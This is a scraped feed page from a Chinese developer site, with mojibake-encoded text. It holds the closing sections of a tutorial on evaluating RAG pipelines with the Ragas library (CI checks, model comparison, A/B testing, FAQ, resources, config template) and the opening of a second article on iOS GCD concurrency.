<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    evaluator = CICDEvaluator()
    passed = evaluator.run_ci_check(evaluation_dataset)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> passed:
        exit(<span class="hljs-number">1</span>)  <span class="hljs-comment"># CI å¤±è´¥</span>
</code></pre>
<h4 data-id="heading-46">7.3 å¤šæ¨¡å‹å¯¹æ¯”</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
å¯¹æ¯”ä¸åŒæ¨¡å‹çš„æ€§èƒ½
"""</span>

<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt

<span class="hljs-keyword">def</span> <span class="hljs-title function_">compare_models</span>(<span class="hljs-params">dataset: EvaluationDataset,
                  model_configs: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>]</span>) -&gt; pd.DataFrame:
    <span class="hljs-string">"""
    å¯¹æ¯”å¤šä¸ªæ¨¡å‹

    Args:
        dataset: æµ‹è¯•æ•°æ®é›†
        model_configs: æ¨¡å‹é…ç½®åˆ—è¡¨
            [{"name": "gpt-4", "model": "gpt-4"},
             {"name": "gpt-3.5", "model": "gpt-3.5-turbo"}]
    """</span>
    results = []

    <span class="hljs-keyword">for</span> config <span class="hljs-keyword">in</span> model_configs:
        <span class="hljs-comment"># ä½¿ç”¨è¯¥æ¨¡å‹æ„å»º RAG</span>
        rag = SimpleRAG(model=config[<span class="hljs-string">"model"</span>])

        <span class="hljs-comment"># è¯„ä¼°</span>
        scores = evaluate(
            dataset=dataset,
            metrics=metrics,
            llm=LangchainLLMWrapper(ChatOpenAI(model=config[<span class="hljs-string">"model"</span>]))
        )

        <span class="hljs-comment"># è®°å½•ç»“æœ</span>
        scores[<span class="hljs-string">"model"</span>] = config[<span class="hljs-string">"name"</span>]
        results.append(scores)

    <span class="hljs-keyword">return</span> pd.DataFrame(results)


<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
model_configs = [
    {<span class="hljs-string">"name"</span>: <span class="hljs-string">"GPT-4"</span>, <span class="hljs-string">"model"</span>: <span class="hljs-string">"gpt-4"</span>},
    {<span class="hljs-string">"name"</span>: <span class="hljs-string">"GPT-3.5"</span>, <span class="hljs-string">"model"</span>: <span class="hljs-string">"gpt-3.5-turbo"</span>},
    {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Claude-3"</span>, <span class="hljs-string">"model"</span>: <span class="hljs-string">"claude-3-opus-20240229"</span>}
]

comparison_df = compare_models(evaluation_dataset, model_configs)

<span class="hljs-comment"># å¯è§†åŒ–</span>
comparison_df.plot(x=<span class="hljs-string">"model"</span>, kind=<span class="hljs-string">"bar"</span>)
plt.title(<span class="hljs-string">"æ¨¡å‹æ€§èƒ½å¯¹æ¯”"</span>)
plt.ylabel(<span class="hljs-string">"åˆ†æ•°"</span>)
plt.legend(bbox_to_anchor=(<span class="hljs-number">1.05</span>, <span class="hljs-number">1</span>), loc=<span class="hljs-string">'upper left'</span>)
plt.tight_layout()
plt.savefig(<span class="hljs-string">"model_comparison.png"</span>)
</code></pre>
<h4 data-id="heading-47">7.4 A/B æµ‹è¯•</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
å¯¹æ–°ç‰ˆæœ¬è¿›è¡Œ A/B æµ‹è¯•
"""</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ABTest</span>:
    <span class="hljs-string">"""A/B æµ‹è¯•æ¡†æ¶"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, control_rag, treatment_rag, dataset</span>):
        self.control = control_rag
        self.treatment = treatment_rag
        self.dataset = dataset

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, sample_size: <span class="hljs-built_in">int</span> = <span class="hljs-number">100</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""è¿è¡Œ A/B æµ‹è¯•"""</span>
        <span class="hljs-comment"># éšæœºé‡‡æ ·</span>
        samples = self.dataset.sample(<span class="hljs-built_in">min</span>(sample_size, <span class="hljs-built_in">len</span>(self.dataset)))

        <span class="hljs-comment"># è¯„ä¼°å¯¹ç…§ç»„</span>
        control_results = self._evaluate_system(self.control, samples)

        <span class="hljs-comment"># è¯„ä¼°å®éªŒç»„</span>
        treatment_results = self._evaluate_system(self.treatment, samples)

        <span class="hljs-comment"># ç»Ÿè®¡æ˜¾è‘—æ€§æµ‹è¯•</span>
        <span class="hljs-keyword">return</span> self._analyze_results(control_results, treatment_results)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_evaluate_system</span>(<span class="hljs-params">self, rag, samples</span>):
        <span class="hljs-string">"""è¯„ä¼°å•ä¸ªç³»ç»Ÿ"""</span>
        results = []
        <span class="hljs-keyword">for</span> _, row <span class="hljs-keyword">in</span> samples.iterrows():
            result = rag.query(row[<span class="hljs-string">"query"</span>])
            results.append(result)
        <span class="hljs-keyword">return</span> results

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_results</span>(<span class="hljs-params">self, control, treatment</span>):
        <span class="hljs-string">"""åˆ†æç»“æœ"""</span>
        <span class="hljs-keyword">from</span> scipy <span class="hljs-keyword">import</span> stats

        analysis = {}
        <span class="hljs-keyword">for</span> metric <span class="hljs-keyword">in</span> control.keys():
            <span class="hljs-comment"># t æ£€éªŒ</span>
            t_stat, p_value = stats.ttest_ind(
                control[metric],
                treatment[metric]
            )
            analysis[metric] = {
                <span class="hljs-string">"control_mean"</span>: np.mean(control[metric]),
                <span class="hljs-string">"treatment_mean"</span>: np.mean(treatment[metric]),
                <span class="hljs-string">"p_value"</span>: p_value,
                <span class="hljs-string">"significant"</span>: p_value &lt; <span class="hljs-number">0.05</span>
            }

        <span class="hljs-keyword">return</span> analysis
</code></pre>
<hr/>
<h3 data-id="heading-48">å…«ã€å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-49">8.1 å®‰è£…é—®é¢˜</h4>
<p><strong>Q: pip install å¤±è´¥æ€ä¹ˆåŠï¼Ÿ</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°è¯•å‡çº§ pip</span>
python -m pip install --upgrade pip

<span class="hljs-comment"># ä½¿ç”¨å›½å†…é•œåƒ</span>
pip install ragas -i https://pypi.tuna.tsinghua.edu.cn/simple

<span class="hljs-comment"># ä½¿ç”¨ conda</span>
conda install -c conda-forge ragas
</code></pre>
<p><strong>Q: å¯¼å…¥é”™è¯¯ï¼Ÿ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ£€æŸ¥ç‰ˆæœ¬å…¼å®¹æ€§</span>
<span class="hljs-keyword">import</span> ragas
<span class="hljs-built_in">print</span>(ragas.__version__)

<span class="hljs-comment"># é‡æ–°å®‰è£…</span>
pip uninstall ragas
pip install ragas --no-cache-<span class="hljs-built_in">dir</span>
</code></pre>
<h4 data-id="heading-50">8.2 è¯„ä¼°é—®é¢˜</h4>
<p><strong>Q: è¯„ä¼°åˆ†æ•°å¼‚å¸¸ï¼ˆå…¨æ˜¯ 0 æˆ– 1ï¼‰ï¼Ÿ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ£€æŸ¥ 1: éªŒè¯æ•°æ®æ ¼å¼</span>
<span class="hljs-built_in">print</span>(evaluation_dataset[<span class="hljs-number">0</span>])

<span class="hljs-comment"># æ£€æŸ¥ 2: æŸ¥çœ‹ LLM å“åº”</span>
<span class="hljs-comment"># è®¾ç½®æ›´è¯¦ç»†çš„æ—¥å¿—</span>
<span class="hljs-keyword">import</span> logging
logging.basicConfig(level=logging.DEBUG)

<span class="hljs-comment"># æ£€æŸ¥ 3: è°ƒæ•´ temperature</span>
evaluator_llm = ChatOpenAI(
    model=<span class="hljs-string">"gpt-4"</span>,
    temperature=<span class="hljs-number">0</span>  <span class="hljs-comment"># ç¡®ä¿ä¸º 0</span>
)
</code></pre>
<p><strong>Q: è¯„ä¼°é€Ÿåº¦å¤ªæ…¢ï¼Ÿ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–¹æ¡ˆ 1: ä½¿ç”¨æ‰¹é‡å¤„ç†</span>
<span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> RunConfig
results = evaluate(
    dataset=dataset,
    metrics=metrics,
    run_config=RunConfig(batch_size=<span class="hljs-number">20</span>)
)

<span class="hljs-comment"># æ–¹æ¡ˆ 2: ä½¿ç”¨æ›´å¿«çš„æ¨¡å‹</span>
evaluator_llm = ChatOpenAI(model=<span class="hljs-string">"gpt-3.5-turbo"</span>)

<span class="hljs-comment"># æ–¹æ¡ˆ 3: å¹¶è¡Œè¯„ä¼°</span>
<span class="hljs-comment"># ï¼ˆå‚è€ƒ 6.3 èŠ‚ä»£ç ï¼‰</span>
</code></pre>
<p><strong>Q: å†…å­˜ä¸è¶³ï¼Ÿ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ†æ‰¹è¯„ä¼°</span>
batch_size = <span class="hljs-number">50</span>
all_results = []

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dataset), batch_size):
    batch = dataset[i:i+batch_size]
    results = evaluate(batch, metrics, evaluator_llm)
    all_results.append(results)

<span class="hljs-comment"># åˆå¹¶ç»“æœ</span>
final_results = merge_results(all_results)
</code></pre>
<h4 data-id="heading-51">8.3 API é—®é¢˜</h4>
<p><strong>Q: OpenAI API é™æµï¼Ÿ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> tenacity <span class="hljs-keyword">import</span> retry, stop_after_attempt, wait_exponential

<span class="hljs-meta">@retry(<span class="hljs-params">stop=stop_after_attempt(<span class="hljs-params"><span class="hljs-number">3</span></span>),
       wait=wait_exponential(<span class="hljs-params">multiplier=<span class="hljs-number">1</span>, <span class="hljs-built_in">min</span>=<span class="hljs-number">4</span>, <span class="hljs-built_in">max</span>=<span class="hljs-number">10</span></span>)</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_with_retry</span>(<span class="hljs-params">dataset, metrics, llm</span>):
    <span class="hljs-keyword">return</span> evaluate(dataset=dataset, metrics=metrics, llm=llm)
</code></pre>
<p><strong>Q: å¦‚ä½•ä½¿ç”¨å…¶ä»– LLMï¼Ÿ</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä½¿ç”¨ Anthropic Claude</span>
<span class="hljs-keyword">from</span> langchain_anthropic <span class="hljs-keyword">import</span> ChatAnthropic

llm = ChatAnthropic(
    model=<span class="hljs-string">"claude-3-opus-20240229"</span>,
    api_key=<span class="hljs-string">"your-api-key"</span>
)

<span class="hljs-comment"># ä½¿ç”¨æœ¬åœ°æ¨¡å‹ (Ollama)</span>
<span class="hljs-keyword">from</span> langchain_community.llms <span class="hljs-keyword">import</span> Ollama
llm = Ollama(model=<span class="hljs-string">"llama3.2"</span>)
</code></pre>
<hr/>
<h3 data-id="heading-52">ä¹ã€ç›¸å…³èµ„æº</h3>
<h4 data-id="heading-53">9.1 å®˜æ–¹èµ„æº</h4>

























<table><thead><tr><th>èµ„æº</th><th>é“¾æ¥</th></tr></thead><tbody><tr><td><strong>GitHub ä»“åº“</strong></td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fexplodinggradients%2Fragas" target="_blank" title="https://github.com/explodinggradients/ragas" ref="nofollow noopener noreferrer">github.com/explodinggrâ€¦</a></td></tr><tr><td><strong>å®˜æ–¹æ–‡æ¡£</strong></td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ragas.io" target="_blank" title="https://docs.ragas.io" ref="nofollow noopener noreferrer">docs.ragas.io</a></td></tr><tr><td><strong>å¿«é€Ÿå…¥é—¨</strong></td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ragas.io%2Fen%2Fstable%2Fgetstarted%2F" target="_blank" title="https://docs.ragas.io/en/stable/getstarted/" ref="nofollow noopener noreferrer">docs.ragas.io/en/stable/gâ€¦</a></td></tr><tr><td><strong>API å‚è€ƒ</strong></td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ragas.io%2Fen%2Fstable%2Freference%2F" target="_blank" title="https://docs.ragas.io/en/stable/reference/" ref="nofollow noopener noreferrer">docs.ragas.io/en/stable/râ€¦</a></td></tr></tbody></table>
<h4 data-id="heading-54">9.2 ä¸­æ–‡æ•™ç¨‹</h4>

























<table><thead><tr><th>æ ‡é¢˜</th><th>é“¾æ¥</th></tr></thead><tbody><tr><td>RAGç³»ç»Ÿæ•ˆæœéš¾è¯„ï¼Ÿ2025å¹´å¿…å¤‡çš„RAGè¯„ä¼°æ¡†æ¶ä¸å·¥å…·è¯¦è§£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1892529470419736435" target="_blank" title="https://zhuanlan.zhihu.com/p/1892529470419736435" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/189252947â€¦</a></td></tr><tr><td>RAGè¯„æµ‹ç»ˆææŒ‡å—ï¼Ragas+RAGFlowå®æˆ˜</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fm0_59235945%2Farticle%2Fdetails%2F153839845" target="_blank" title="https://blog.csdn.net/m0_59235945/article/details/153839845" ref="nofollow noopener noreferrer">blog.csdn.net/m0_59235945â€¦</a></td></tr><tr><td>æ·±åº¦æµ‹è¯„RAGåº”ç”¨è¯„ä¼°æ¡†æ¶ï¼šæŒ‡æ ‡æœ€å…¨é¢çš„Ragas</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2505892" target="_blank" title="https://cloud.tencent.com/developer/article/2505892" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/aâ€¦</a></td></tr><tr><td>ä½¿ç”¨æœ¬åœ°ç§æœ‰å¤§æ¨¡å‹è¿›è¡ŒRAGASè¯„ä¼°</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_46024883%2Farticle%2Fdetails%2F146588586" target="_blank" title="https://blog.csdn.net/qq_46024883/article/details/146588586" ref="nofollow noopener noreferrer">blog.csdn.net/qq_46024883â€¦</a></td></tr></tbody></table>
<h4 data-id="heading-55">9.3 è§†é¢‘æ•™ç¨‹</h4>




















<table><thead><tr><th>å¹³å°</th><th>æ ‡é¢˜</th><th>é“¾æ¥</th></tr></thead><tbody><tr><td>Bç«™</td><td>2025å¹´æœ€å…¨æœ€ç»†çš„å¤§æ¨¡å‹RAGæ•™ç¨‹</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1D37GzLEe5%2F" target="_blank" title="https://www.bilibili.com/video/BV1D37GzLEe5/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1D3â€¦</a></td></tr><tr><td>YouTube</td><td>How to Evaluate a RAG Application</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D5fp6e5nhJRk" target="_blank" title="https://www.youtube.com/watch?v=5fp6e5nhJRk" ref="nofollow noopener noreferrer">www.youtube.com/watch?v=5fpâ€¦</a></td></tr></tbody></table>
<h4 data-id="heading-56">9.4 ç¤¾åŒºä¸æ”¯æŒ</h4>





















<table><thead><tr><th>èµ„æº</th><th>é“¾æ¥</th></tr></thead><tbody><tr><td>Discord ç¤¾åŒº</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2Fragas" target="_blank" title="https://discord.gg/ragas" ref="nofollow noopener noreferrer">discord.gg/ragas</a></td></tr><tr><td>Stack Overflow</td><td>[tag:ragas]</td></tr><tr><td>è®ºå›è®¨è®º</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fexplodinggradients%2Fragas%2Fdiscussions" target="_blank" title="https://github.com/explodinggradients/ragas/discussions" ref="nofollow noopener noreferrer">github.com/explodinggrâ€¦</a></td></tr></tbody></table>
<hr/>
<h3 data-id="heading-57">é™„å½•</h3>
<h4 data-id="heading-58">A. å¿«é€Ÿå‚è€ƒ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¸¸ç”¨å¯¼å…¥</span>
<span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> evaluate, EvaluationDataset
<span class="hljs-keyword">from</span> ragas.metrics <span class="hljs-keyword">import</span> (
    ContextPrecision,
    LLMContextRecall,
    Faithfulness,
    AnswerRelevancy,
    FactualCorrectness
)
<span class="hljs-keyword">from</span> ragas.llms <span class="hljs-keyword">import</span> LangchainLLMWrapper
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI

<span class="hljs-comment"># æ ‡å‡†è¯„ä¼°æµç¨‹</span>
evaluator_llm = LangchainLLMWrapper(ChatOpenAI(model=<span class="hljs-string">"gpt-4o"</span>))
results = evaluate(
    dataset=evaluation_dataset,
    metrics=[
        ContextPrecision(),
        LLMContextRecall(),
        Faithfulness()
    ],
    llm=evaluator_llm
)
</code></pre>
<h4 data-id="heading-59">B. è¯„ä¼°æŒ‡æ ‡é€ŸæŸ¥è¡¨</h4>









































<table><thead><tr><th>æŒ‡æ ‡</th><th>ç±»å‹</th><th>èŒƒå›´</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>Context Precision</td><td>æ£€ç´¢</td><td>0-1</td><td>æ£€ç´¢è´¨é‡è¯„ä¼°</td></tr><tr><td>Context Recall</td><td>æ£€ç´¢</td><td>0-1</td><td>æ£€ç´¢å®Œæ•´æ€§</td></tr><tr><td>Faithfulness</td><td>ç”Ÿæˆ</td><td>0-1</td><td>å¹»è§‰æ£€æµ‹</td></tr><tr><td>Answer Relevancy</td><td>ç”Ÿæˆ</td><td>0-1</td><td>ç­”æ¡ˆè´¨é‡</td></tr><tr><td>Factual Correctness</td><td>ç”Ÿæˆ</td><td>0-1</td><td>äº‹å®å‡†ç¡®æ€§</td></tr></tbody></table>
<h4 data-id="heading-60">C. é…ç½®æ¨¡æ¿</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># ragas_config.yaml</span>
<span class="hljs-attr">evaluation:</span>
  <span class="hljs-comment"># è¯„ä¼°å™¨é…ç½®</span>
  <span class="hljs-attr">evaluator:</span>
    <span class="hljs-attr">model:</span> <span class="hljs-string">"gpt-4o"</span>
    <span class="hljs-attr">temperature:</span> <span class="hljs-number">0</span>
    <span class="hljs-attr">max_tokens:</span> <span class="hljs-number">1024</span>

  <span class="hljs-comment"># æŒ‡æ ‡é…ç½®</span>
  <span class="hljs-attr">metrics:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">context_precision</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">context_recall</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">faithfulness</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">answer_relevancy</span>

  <span class="hljs-comment"># è¿è¡Œé…ç½®</span>
  <span class="hljs-attr">run_config:</span>
    <span class="hljs-attr">batch_size:</span> <span class="hljs-number">10</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">max_retries:</span> <span class="hljs-number">3</span>

  <span class="hljs-comment"># è¾“å‡ºé…ç½®</span>
  <span class="hljs-attr">output:</span>
    <span class="hljs-attr">format:</span> <span class="hljs-string">"csv"</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">"./results"</span>
    <span class="hljs-attr">save_detailed:</span> <span class="hljs-literal">true</span>
</code></pre>
<hr/>
<p><strong>æ–‡æ¡£ç»“æŸ</strong></p>
<p>å¦‚æœ‰é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿åé¦ˆï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èŠèŠGCD]]></title>    <link>https://juejin.cn/post/7595043440519593990</link>    <guid>https://juejin.cn/post/7595043440519593990</guid>    <pubDate>2026-01-14T10:38:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043440519593990" data-draft-id="7594863660297879594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èŠèŠGCD"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-14T10:38:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dongczlu"/> <meta itemprop="url" content="https://juejin.cn/user/3940246036430125"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èŠèŠGCD
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3940246036430125/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dongczlu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T10:38:17.000Z" title="Wed Jan 14 2026 10:38:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">GCD è¯¦è§£ - ä»å…¥é—¨åˆ°ç²¾é€š</h2>
<h3 data-id="heading-1">ğŸ“Œ å¿«é€Ÿå‚è€ƒå¡ç‰‡</h3>
<pre><code class="hljs language-csharp" lang="csharp">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  GCD æ ¸å¿ƒæ¦‚å¿µ                                    â”‚
â”‚  â”œâ”€ é˜Ÿåˆ—ï¼ˆQueueï¼‰ï¼šä»»åŠ¡å®¹å™¨                       â”‚
â”‚  â”‚   â”œâ”€ ä¸²è¡Œé˜Ÿåˆ—ï¼šä¸€æ¬¡ä¸€ä¸ªä»»åŠ¡                   â”‚
â”‚  â”‚   â””â”€ å¹¶è¡Œé˜Ÿåˆ—ï¼šåŒæ—¶å¤šä¸ªä»»åŠ¡                   â”‚
â”‚  â”œâ”€ æ‰§è¡Œæ–¹å¼ï¼šå¦‚ä½•æäº¤ä»»åŠ¡                       â”‚
â”‚  â”‚   â”œâ”€ syncï¼šåŒæ­¥ï¼Œé˜»å¡ç­‰å¾…                     â”‚
â”‚  â”‚   â””â”€ <span class="hljs-keyword">async</span>ï¼šå¼‚æ­¥ï¼Œç«‹å³è¿”å›                    â”‚
â”‚  â””â”€ ç³»ç»Ÿé˜Ÿåˆ—ï¼šé¢„å®šä¹‰çš„é˜Ÿåˆ—                       â”‚
â”‚      â”œâ”€ mainï¼šä¸»é˜Ÿåˆ—ï¼ˆä¸²è¡Œï¼‰                     â”‚
â”‚      â””â”€ <span class="hljs-keyword">global</span>ï¼šå…¨å±€é˜Ÿåˆ—ï¼ˆå¹¶è¡Œï¼‰                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

